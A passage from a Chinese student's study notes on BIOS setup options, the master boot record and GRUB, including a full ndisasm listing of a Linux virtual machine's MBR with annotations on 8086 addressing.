<p>多处理器规定,推测和解决多处理器对总线的竞争等等事务有关,还需要进一步阅读intel官方文件</p>
<h5 id="installed-os">Installed O/S</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613153315480.png"
alt="image-20220613153315480" />
<figcaption aria-hidden="true">image-20220613153315480</figcaption>
</figure>
<p>计算机启动到此时,并没有装载操作系统,如果有多系统的话,是时候做出选择了</p>
<h5 id="reset-configuration-data">Reset Configuration Data:</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613153439605.png"
alt="image-20220613153439605" />
<figcaption aria-hidden="true">image-20220613153439605</figcaption>
</figure>
<p>重设,在BIOS上做出的修改全都改回去?</p>
<p>如果真的是这个功能,那么Exit是干啥用的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613210834456.png"
alt="image-20220613210834456" />
<figcaption aria-hidden="true">image-20220613210834456</figcaption>
</figure>
<h5 id="cache-memory">Cache Memory</h5>
<p>内存的高速缓存</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613153550753.png"
alt="image-20220613153550753" />
<figcaption aria-hidden="true">image-20220613153550753</figcaption>
</figure>
<p>第一个选项是选择启动还是关闭内存到CPU之间的高速缓存</p>
<p>第二个选项是系统总线的高速缓存,</p>
<p>...</p>
<h5 id="io-device-configuration">I/O Device Configuration</h5>
<p>"输入输出设备配置"</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613204029245.png"
alt="image-20220613204029245" />
<figcaption aria-hidden="true">image-20220613204029245</figcaption>
</figure>
<p>Serial
port:串行通信接口,通过该接口,信息只能按顺序,一个一个比特传输</p>
<p>比如</p>
<figure>
<img
src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b3/Serial_port_(9-pin).jpg/170px-Serial_port_(9-pin).jpg"
alt="DE-9 公口" />
<figcaption aria-hidden="true">DE-9 公口</figcaption>
</figure>
<p>Parallel port:并行通信接口,一次性并行传送多个比特</p>
<p>比如</p>
<figure>
<img
src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Parallel_computer_printer_port.jpg/150px-Parallel_computer_printer_port.jpg"
alt="DB-25 母口" />
<figcaption aria-hidden="true">DB-25 母口</figcaption>
</figure>
<p>Floppy disk controller,软盘控制器</p>
<p>I/O Device Configuration就是修改这些接口是否使能,信息传送方向等</p>
<h5 id="large-disk-access-mode">Large Disk Access Mode</h5>
<p>大硬盘访问模式</p>
<blockquote>
<p>关于硬盘模式</p>
<p>参考<a
target="_blank" rel="noopener" href="https://www.muzijie.com/a1/43w5o5m3.html">BIOS设置硬盘工作模式 -
木子杰软件教程 (muzijie.com)</a></p>
<p>NORMAL普通模式是最早的IDE方式。在此方式下对硬盘访问时,BIOS和IDE控制器对参数不作任何转换。</p>
<p>该模式支持的最大柱面数为1024,最大磁头数为16,最大扇区数为63,每扇区字节数为
512。因此支持最大硬盘容量为：<span
class="math inline">\(512×63×16×1024=528MB\)</span>。</p>
<p>在此模式下即使硬盘的实际物理容量更大,但可访问的硬盘空间也只能是528MB。</p>
<p>LBA(Logical Block Addressing)逻辑块寻址模式。</p>
<p>这种模式所管理的硬盘空间突破了528KB 的瓶颈,可达8.4GB。</p>
<p>在LBA模式下,设置的柱面、磁头、扇区等参数并不是实际硬盘的物理参数。</p>
<p>在访问硬盘时,由IDE控制器把由柱面、磁头、扇区等参数确定的逻辑地址转换为实际硬盘的物理地址。</p>
<p>在LBA模式下,可设置的最大磁头数为255,其余参数与普通模式相同。</p>
<p>由此可计算出可访问的硬盘容量为:<span
class="math inline">\(512×63×255×1024=8.4GB\)</span>。</p>
<p>LARGE大硬盘模式。当硬盘的柱面超过1024而又不为LBA支持时可采用此种模式。</p>
<p>LARGE模式采取的方法是把柱面数除以2,把磁头数乘以2,其结果总容量不变。</p>
<p>例如,在NORMAL模式下柱面数为1220,磁头数为16,进入LARGE模式则柱面数为610,磁头数为32。</p>
<p>这样在DOS看来柱面数小于1024,即可正常工作。目前基本上只有LBA有实际意义了。</p>
</blockquote>
<h5 id="local-bus-ide-adapter">Local Bus IDE adapter</h5>
<p>局部总线IDE适配器</p>
<blockquote>
<p>随着CPU的飞速发展,
总线的低传输速率与微处理器的高处理速度不能同步,</p>
<p>造成硬盘、图形卡和其它高速外设只能通过一个狭窄而缓慢的瓶颈发送和接收数据,</p>
<p>从而严重影响了CPU高性能的充分发挥, 工业界因此又发展了局域总线(Local
Bus)的新技术.</p>
<p>局域总线是在CPU总线与ISA或EISA总线之间新增加的一级总线.</p>
<p>它独立于CPU的结构, 与CPU的时钟频率无关,
使总线形成了一种独特的中间缓冲器.</p>
<p>一些高速外设, 如网卡和硬盘适配器等, 可以从ISA总线上卸下,</p>
<p><strong>通过局域总线直接挂接到CPU总线上,
从而解决了低速总线在高速微处理器和高速外设之间形成的瓶颈.</strong></p>
<p>什么是总线、总线的类型、局部总线、局部总线类型和什么是接口方式？什么是IDE？什么是SCSI？</p>
</blockquote>
<h5 id="advanced-chipset-control">Advanced Chipset Control</h5>
<p>"高级芯片控制"</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613210006072.png"
alt="image-20220613210006072" />
<figcaption aria-hidden="true">image-20220613210006072</figcaption>
</figure>
<p>我是真的一点儿看不懂了</p>
<h4 id="security视图">Security视图</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613210213455.png"
alt="image-20220613210213455" />
<figcaption aria-hidden="true">image-20220613210213455</figcaption>
</figure>
<p>设置密码用的</p>
<h4 id="boot">Boot</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613210249009.png"
alt="image-20220613210249009" />
<figcaption aria-hidden="true">image-20220613210249009</figcaption>
</figure>
<p>用+或者-调整设备顺序</p>
<p>这里就是"9.BIOS解决设备冲突,确定boot所在的设备"需要设置的</p>
<p>如果使用U盘作为安装盘,则BOOT中USB串行通用接口设置到最前</p>
<p>在物理机上如果U盘设置到磁盘的后面,BIOS会从磁盘启动,如果磁盘中之前有装好的操作系统,则BIOS将会唤醒那个操作系统</p>
<p>如果磁盘中没有操作系统则BIOS重新尝试从U盘启动</p>
<h2 id="主引导记录mbr">主引导记录MBR</h2>
<p>在BIOS boot视图下,我们设置了启动顺序</p>
<p>现在,BIOS按照该顺序给控制权</p>
<p>控制交给第一个存储设备,CPU读取该设备最前面512字节</p>
<p>如果该设备的最后两个字节为<code>0x55 AA</code>则表明这个设备可以用于启动操作系统.</p>
<p>否则这个设备白搭,控制交给下一个设备</p>
<h3 id="磁盘上的主引导记录">磁盘上的主引导记录</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613110740974.png"
alt="MOS-磁盘文件系统布局" />
<figcaption aria-hidden="true">MOS-磁盘文件系统布局</figcaption>
</figure>
<p>整个磁盘只有一个MBR(master boot
record)主引导记录,一个分区表(分区表是MBR的一部分)</p>
<p><img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613114613846.png"
alt="MBR结构" />最开始的218个字节就是<code>Bootstrap code area</code></p>
<p>后面有多个磁盘分区,每个分区在分区表中都有一条记录,记录该分区的开始与结束</p>
<p>这里"分区"在我们小打小闹儿的笔记本子上就是指卷(简单卷)</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613113439425.png"
alt="image-20220613113439425" />
<figcaption aria-hidden="true">image-20220613113439425</figcaption>
</figure>
<p>比如我的电脑512G的固态硬盘被分成三个卷</p>
<p>MOS上关于这部分的描述十分滴珍贵,写的是汉字但是就是不说人话</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613113524034.png"
alt="image-20220613113524034" />
<figcaption aria-hidden="true">image-20220613113524034</figcaption>
</figure>
<p>从"表中的一个分区被标记为活动分区"这句开始,我就不知道它在说什么了</p>
<p><strong>活动分区</strong>是什么,不给说,查了百科才知道</p>
<blockquote>
<p>活动分区是计算机系统分区，启动操作系统的文件都装在这个分区，Windows
系统下一般被默认为C盘。</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613113709933.png"
alt="image-20220613113709933" />
<figcaption aria-hidden="true">image-20220613113709933</figcaption>
</figure>
</blockquote>
<p>在我的linux虚拟机上观察磁盘的前512个字节</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613211928369.png"
alt="image-20220613211928369" />
<figcaption aria-hidden="true">image-20220613211928369</figcaption>
</figure>
<p>使用dd命令将磁盘的前512个字节备份到虚拟机和Executor本机的共享文件夹下面,然后在本机上用010editor打开刚才导出的备份文件</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613212116779.png"
alt="MBR on Linux" />
<figcaption aria-hidden="true">MBR on Linux</figcaption>
</figure>
<p>最后两个字节是<code>0x 55 AA</code>表明该512个字节为MBR</p>
<p>从右侧的Hex视图可以看出有一些有意义的字节比如</p>
<p>GRUB,Hard Disk.Read.Error等等</p>
<p>猜测MBR在执行的时候会说一些话,可能就会说这里的ASCII编码</p>
<p>MBR的前466个字节是机器码,boot
loader,启动引导程序,在我的虚拟机上即grub程序</p>
<p>第447到510字节是分区表,作用是将硬盘分成不同卷</p>
<p>511到512是标志主引导记录的魔数(0x55 AA)</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/loader_menu.gif"
alt="启动管理程序的菜单功能与控制权转交功能示意图" />
<figcaption
aria-hidden="true">启动管理程序的菜单功能与控制权转交功能示意图</figcaption>
</figure>
<p>在MOS给出的磁盘文件系统布局图上,可以发现每个磁盘分区最开始都有一个引导块,这个引导块中也可以有grub程序</p>
<p>主引导块之所以叫做"主",是因为它是BIOS默认调用的引导块,并且主引导块可以选择让权,即把引导工作让给其他磁盘分区中的引导块完成</p>
<p>一般windows系统的主引导块没有这个作用,linux有,而安装多系统的时候主引导块会相互覆盖</p>
<p>因此应该首先安装windows系统然后安装linux系统,如此主引导块就可以选择让权或者直接引导了</p>
<h2 id="grub">Grub</h2>
<p>一是满足我对MBR干了什么的好奇心,而是复习一下计组8086上的汇编语言,我们对Grub进行反汇编分析</p>
<p>我太想知道这短短的466字节机器码,都干了什么了,他们是不是汇编语言或者C语言编译成的机器码呢?</p>
<h3 id="两个阶段">两个阶段</h3>
<p>第一阶段:</p>
<p>boot loader的主程序需要写在主引导分区或者其他磁盘分区的引导块里.</p>
<p>但引导块太小了,只能放下boot
loader的最小主程序,相关配置在第二阶段完成</p>
<p>第二阶段:</p>
<p>grub的相关配置都在<code>/boot/grub</code>下面放着</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220615000440311.png"
alt="image-20220615000440311" />
<figcaption aria-hidden="true">image-20220615000440311</figcaption>
</figure>
<p>该目录下面是grub配置文件grub.cfg以及各种文件系统定义</p>
<blockquote>
<p>grub的配置文件不光有<code>grub.cfg</code></p>
<p>redhat,ubuntu等等各种系统的grub配置文件叫法不一样</p>
<p>在我的ubuntu10.04虚拟机上配置文件是grub.cfg</p>
</blockquote>
<h3 id="反汇编分析">反汇编分析</h3>
<p>查阅了万能的网友的博客之后,linux上的nasm可以反编译</p>
<p>用我本机上的kali子系统反编译一下就得到了非常像计组课本上的8086汇编语言</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/e/share]</span><br><span class="line">└─# ndisasm mbr.bak &gt; mbr.asm</span><br></pre></td></tr></table></figure>
<p>然后怎么分析?一共223行的汇编指令,属实高估自己的逆向能力了,与其摸着石头过河,不如先了解MBR有什么行为,然后看反汇编去取证</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/bc74f5d963f0419aa3ae51d08950272e.png"
alt="MBR总览" />
<figcaption aria-hidden="true">MBR总览</figcaption>
</figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line">00000000  EB63              jmp short 0x65</span><br><span class="line">00000002  90                nop</span><br><span class="line">00000003  108ED0BC          adc [bp-0x4330],cl</span><br><span class="line">00000007  00B0B800          add [bx+si+0xb8],dh</span><br><span class="line">0000000B  008ED88E          add [bp-0x7128],cl</span><br><span class="line">0000000F  C0FBBE            sar bl,byte 0xbe</span><br><span class="line">00000012  007CBF            add [si-0x41],bh</span><br><span class="line">00000015  0006B900          add [0xb9],al</span><br><span class="line">00000019  02F3              add dh,bl</span><br><span class="line">0000001B  A4                movsb</span><br><span class="line">0000001C  EA21060000        jmp 0x0:0x621</span><br><span class="line">00000021  BEBE07            mov si,0x7be</span><br><span class="line">00000024  3804              cmp [si],al</span><br><span class="line">00000026  750B              jnz 0x33</span><br><span class="line">00000028  83C610            add si,byte +0x10</span><br><span class="line">0000002B  81FEFE07          cmp si,0x7fe</span><br><span class="line">0000002F  75F3              jnz 0x24</span><br><span class="line">00000031  EB16              jmp short 0x49</span><br><span class="line">00000033  B402              mov ah,0x2</span><br><span class="line">00000035  B001              mov al,0x1</span><br><span class="line">00000037  BB007C            mov bx,0x7c00</span><br><span class="line">0000003A  B280              mov dl,0x80</span><br><span class="line">0000003C  8A7401            mov dh,[si+0x1]</span><br><span class="line">0000003F  8B4C02            mov cx,[si+0x2]</span><br><span class="line">00000042  CD13              int 0x13</span><br><span class="line">00000044  EA007C0000        jmp 0x0:0x7c00</span><br><span class="line">00000049  EBFE              jmp short 0x49</span><br><span class="line">0000004B  0000              add [bx+si],al</span><br><span class="line">0000004D  0000              add [bx+si],al</span><br><span class="line">0000004F  0000              add [bx+si],al</span><br><span class="line">00000051  0000              add [bx+si],al</span><br><span class="line">00000053  0000              add [bx+si],al</span><br><span class="line">00000055  0000              add [bx+si],al</span><br><span class="line">00000057  0000              add [bx+si],al</span><br><span class="line">00000059  0000              add [bx+si],al</span><br><span class="line">0000005B  800100            add byte [bx+di],0x0</span><br><span class="line">0000005E  0000              add [bx+si],al</span><br><span class="line">00000060  0000              add [bx+si],al</span><br><span class="line">00000062  0000              add [bx+si],al</span><br><span class="line">00000064  FF                db 0xff</span><br><span class="line">00000065  FA                cli</span><br><span class="line">00000066  90                nop</span><br><span class="line">00000067  90                nop</span><br><span class="line">00000068  F6C280            test dl,0x80</span><br><span class="line">0000006B  7502              jnz 0x6f</span><br><span class="line">0000006D  B280              mov dl,0x80</span><br><span class="line">0000006F  EA747C0000        jmp 0x0:0x7c74</span><br><span class="line">00000074  31C0              xor ax,ax</span><br><span class="line">00000076  8ED8              mov ds,ax</span><br><span class="line">00000078  8ED0              mov ss,ax</span><br><span class="line">0000007A  BC0020            mov sp,0x2000</span><br><span class="line">0000007D  FB                sti</span><br><span class="line">0000007E  A0647C            mov al,[0x7c64]</span><br><span class="line">00000081  3CFF              cmp al,0xff</span><br><span class="line">00000083  7402              jz 0x87</span><br><span class="line">00000085  88C2              mov dl,al</span><br><span class="line">00000087  52                push dx</span><br><span class="line">00000088  BB1704            mov bx,0x417</span><br><span class="line">0000008B  802703            and byte [bx],0x3</span><br><span class="line">0000008E  7406              jz 0x96</span><br><span class="line">00000090  BE887D            mov si,0x7d88</span><br><span class="line">00000093  E81C01            call 0x1b2</span><br><span class="line">00000096  BE057C            mov si,0x7c05</span><br><span class="line">00000099  F6C280            test dl,0x80</span><br><span class="line">0000009C  7448              jz 0xe6</span><br><span class="line">0000009E  B441              mov ah,0x41</span><br><span class="line">000000A0  BBAA55            mov bx,0x55aa</span><br><span class="line">000000A3  CD13              int 0x13</span><br><span class="line">000000A5  5A                pop dx</span><br><span class="line">000000A6  52                push dx</span><br><span class="line">000000A7  723D              jc 0xe6</span><br><span class="line">000000A9  81FB55AA          cmp bx,0xaa55</span><br><span class="line">000000AD  7537              jnz 0xe6</span><br><span class="line">000000AF  83E101            and cx,byte +0x1</span><br><span class="line">000000B2  7432              jz 0xe6</span><br><span class="line">000000B4  31C0              xor ax,ax</span><br><span class="line">000000B6  894404            mov [si+0x4],ax</span><br><span class="line">000000B9  40                inc ax</span><br><span class="line">000000BA  8844FF            mov [si-0x1],al</span><br><span class="line">000000BD  894402            mov [si+0x2],ax</span><br><span class="line">000000C0  C7041000          mov word [si],0x10</span><br><span class="line">000000C4  668B1E5C7C        mov ebx,[0x7c5c]</span><br><span class="line">000000C9  66895C08          mov [si+0x8],ebx</span><br><span class="line">000000CD  668B1E607C        mov ebx,[0x7c60]</span><br><span class="line">000000D2  66895C0C          mov [si+0xc],ebx</span><br><span class="line">000000D6  C744060070        mov word [si+0x6],0x7000</span><br><span class="line">000000DB  B442              mov ah,0x42</span><br><span class="line">000000DD  CD13              int 0x13</span><br><span class="line">000000DF  7205              jc 0xe6</span><br><span class="line">000000E1  BB0070            mov bx,0x7000</span><br><span class="line">000000E4  EB76              jmp short 0x15c</span><br><span class="line">000000E6  B408              mov ah,0x8</span><br><span class="line">000000E8  CD13              int 0x13</span><br><span class="line">000000EA  730D              jnc 0xf9</span><br><span class="line">000000EC  F6C280            test dl,0x80</span><br><span class="line">000000EF  0F84D000          jz near 0x1c3</span><br><span class="line">000000F3  BE937D            mov si,0x7d93</span><br><span class="line">000000F6  E98200            jmp 0x17b</span><br><span class="line">000000F9  660FB6C6          movzx eax,dh</span><br><span class="line">000000FD  8864FF            mov [si-0x1],ah</span><br><span class="line">00000100  40                inc ax</span><br><span class="line">00000101  66894404          mov [si+0x4],eax</span><br><span class="line">00000105  0FB6D1            movzx dx,cl</span><br><span class="line">00000108  C1E202            shl dx,byte 0x2</span><br><span class="line">0000010B  88E8              mov al,ch</span><br><span class="line">0000010D  88F4              mov ah,dh</span><br><span class="line">0000010F  40                inc ax</span><br><span class="line">00000110  894408            mov [si+0x8],ax</span><br><span class="line">00000113  0FB6C2            movzx ax,dl</span><br><span class="line">00000116  C0E802            shr al,byte 0x2</span><br><span class="line">00000119  668904            mov [si],eax</span><br><span class="line">0000011C  66A1607C          mov eax,[0x7c60]</span><br><span class="line">00000120  6609C0            or eax,eax</span><br><span class="line">00000123  754E              jnz 0x173</span><br><span class="line">00000125  66A15C7C          mov eax,[0x7c5c]</span><br><span class="line">00000129  6631D2            xor edx,edx</span><br><span class="line">0000012C  66F734            div dword [si]</span><br><span class="line">0000012F  88D1              mov cl,dl</span><br><span class="line">00000131  31D2              xor dx,dx</span><br><span class="line">00000133  66F77404          div dword [si+0x4]</span><br><span class="line">00000137  3B4408            cmp ax,[si+0x8]</span><br><span class="line">0000013A  7D37              jnl 0x173</span><br><span class="line">0000013C  FEC1              inc cl</span><br><span class="line">0000013E  88C5              mov ch,al</span><br><span class="line">00000140  30C0              xor al,al</span><br><span class="line">00000142  C1E802            shr ax,byte 0x2</span><br><span class="line">00000145  08C1              or cl,al</span><br><span class="line">00000147  88D0              mov al,dl</span><br><span class="line">00000149  5A                pop dx</span><br><span class="line">0000014A  88C6              mov dh,al</span><br><span class="line">0000014C  BB0070            mov bx,0x7000</span><br><span class="line">0000014F  8EC3              mov es,bx</span><br><span class="line">00000151  31DB              xor bx,bx</span><br><span class="line">00000153  B80102            mov ax,0x201</span><br><span class="line">00000156  CD13              int 0x13</span><br><span class="line">00000158  721E              jc 0x178</span><br><span class="line">0000015A  8CC3              mov bx,es</span><br><span class="line">0000015C  60                pusha</span><br><span class="line">0000015D  1E                push ds</span><br><span class="line">0000015E  B90001            mov cx,0x100</span><br><span class="line">00000161  8EDB              mov ds,bx</span><br><span class="line">00000163  31F6              xor si,si</span><br><span class="line">00000165  BF0080            mov di,0x8000</span><br><span class="line">00000168  8EC6              mov es,si</span><br><span class="line">0000016A  FC                cld</span><br><span class="line">0000016B  F3A5              rep movsw</span><br><span class="line">0000016D  1F                pop ds</span><br><span class="line">0000016E  61                popa</span><br><span class="line">0000016F  FF265A7C          jmp [0x7c5a]</span><br><span class="line">00000173  BE8E7D            mov si,0x7d8e</span><br><span class="line">00000176  EB03              jmp short 0x17b</span><br><span class="line">00000178  BE9D7D            mov si,0x7d9d</span><br><span class="line">0000017B  E83400            call 0x1b2</span><br><span class="line">0000017E  BEA27D            mov si,0x7da2</span><br><span class="line">00000181  E82E00            call 0x1b2</span><br><span class="line">00000184  CD18              int 0x18</span><br><span class="line">00000186  EBFE              jmp short 0x186</span><br><span class="line">00000188  47                inc di</span><br><span class="line">00000189  52                push dx</span><br><span class="line">0000018A  55                push bp</span><br><span class="line">0000018B  42                inc dx</span><br><span class="line">0000018C  2000              and [bx+si],al</span><br><span class="line">0000018E  47                inc di</span><br><span class="line">0000018F  656F              gs outsw</span><br><span class="line">00000191  6D                insw</span><br><span class="line">00000192  004861            add [bx+si+0x61],cl</span><br><span class="line">00000195  7264              jc 0x1fb</span><br><span class="line">00000197  204469            and [si+0x69],al</span><br><span class="line">0000019A  736B              jnc 0x207</span><br><span class="line">0000019C  005265            add [bp+si+0x65],dl</span><br><span class="line">0000019F  61                popa</span><br><span class="line">000001A0  640020            add [fs:bx+si],ah</span><br><span class="line">000001A3  45                inc bp</span><br><span class="line">000001A4  7272              jc 0x218</span><br><span class="line">000001A6  6F                outsw</span><br><span class="line">000001A7  720D              jc 0x1b6</span><br><span class="line">000001A9  0A00              or al,[bx+si]</span><br><span class="line">000001AB  BB0100            mov bx,0x1</span><br><span class="line">000001AE  B40E              mov ah,0xe</span><br><span class="line">000001B0  CD10              int 0x10</span><br><span class="line">000001B2  AC                lodsb</span><br><span class="line">000001B3  3C00              cmp al,0x0</span><br><span class="line">000001B5  75F4              jnz 0x1ab</span><br><span class="line">000001B7  C3                ret</span><br><span class="line">000001B8  21BF0E00          and [bx+0xe],di</span><br><span class="line">000001BC  0000              add [bx+si],al</span><br><span class="line">000001BE  802021            and byte [bx+si],0x21</span><br><span class="line">000001C1  0083FEFF          add [bp+di-0x2],al</span><br><span class="line">000001C5  FF00              inc word [bx+si]</span><br><span class="line">000001C7  0800              or [bx+si],al</span><br><span class="line">000001C9  0000              add [bx+si],al</span><br><span class="line">000001CB  48                dec ax</span><br><span class="line">000001CC  6308              arpl [bx+si],cx</span><br><span class="line">000001CE  00FE              add dh,bh</span><br><span class="line">000001D0  FF                db 0xff</span><br><span class="line">000001D1  FF05              inc word [di]</span><br><span class="line">000001D3  FE                db 0xfe</span><br><span class="line">000001D4  FF                db 0xff</span><br><span class="line">000001D5  FF                db 0xff</span><br><span class="line">000001D6  FE                db 0xfe</span><br><span class="line">000001D7  57                push di</span><br><span class="line">000001D8  6308              arpl [bx+si],cx</span><br><span class="line">000001DA  02A05C00          add ah,[bx+si+0x5c]</span><br><span class="line">000001DE  0000              add [bx+si],al</span><br><span class="line">000001E0  0000              add [bx+si],al</span><br><span class="line">000001E2  0000              add [bx+si],al</span><br><span class="line">000001E4  0000              add [bx+si],al</span><br><span class="line">000001E6  0000              add [bx+si],al</span><br><span class="line">000001E8  0000              add [bx+si],al</span><br><span class="line">000001EA  0000              add [bx+si],al</span><br><span class="line">000001EC  0000              add [bx+si],al</span><br><span class="line">000001EE  0000              add [bx+si],al</span><br><span class="line">000001F0  0000              add [bx+si],al</span><br><span class="line">000001F2  0000              add [bx+si],al</span><br><span class="line">000001F4  0000              add [bx+si],al</span><br><span class="line">000001F6  0000              add [bx+si],al</span><br><span class="line">000001F8  0000              add [bx+si],al</span><br><span class="line">000001FA  0000              add [bx+si],al</span><br><span class="line">000001FC  0000              add [bx+si],al</span><br><span class="line">000001FE  55                push bp</span><br><span class="line">000001FF  AA                stosb</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果使用ida反汇编分析</p>
<p>将mbr.bak改成mbr.exe之后使用ida打开,ida默认Segment
bitness为32位,需要改成16位</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613232353523.png"
alt="image-20220613232353523" />
<figcaption aria-hidden="true">image-20220613232353523</figcaption>
</figure>
<p>一开始ida会把所有指令当作数据,只需要按一下c就可以变为指令</p>
<p>ida提供了交叉引用跳转提示和注释,他真的,我哭死</p>
</blockquote>
<p>以下反汇编分析过程参考了</p>
<p><a
target="_blank" rel="noopener" href="https://blog.csdn.net/lijiewen2017/article/details/124574991">MBR引导程序源码理解</a></p>
<p>和鸟哥的Linux私房菜第19章</p>
<p>首先记住,BIOS将MBR中的Grub加载到主存的0x7c00处,段寄存器cs存放的是0x7c00</p>
<h4
id="eb63-jmp-short-0x65"><code>00000000  EB63        jmp short 0x65</code></h4>
<blockquote>
<p>第一条指令,可以看出其反汇编的格式为</p>
<p>内存偏移量,机器码,汇编指令</p>
</blockquote>
<blockquote>
<p>关于8086内存寻址的实现:</p>
<p>段寄存器对内存分段实现,8086上的跳转指令有段跳转和跨段跳转两种</p>
<p>CPU当前执行的指令是由<code>CS:IP</code>两个寄存器共同决定的,物理地址=段寄存器*16+偏移地址,
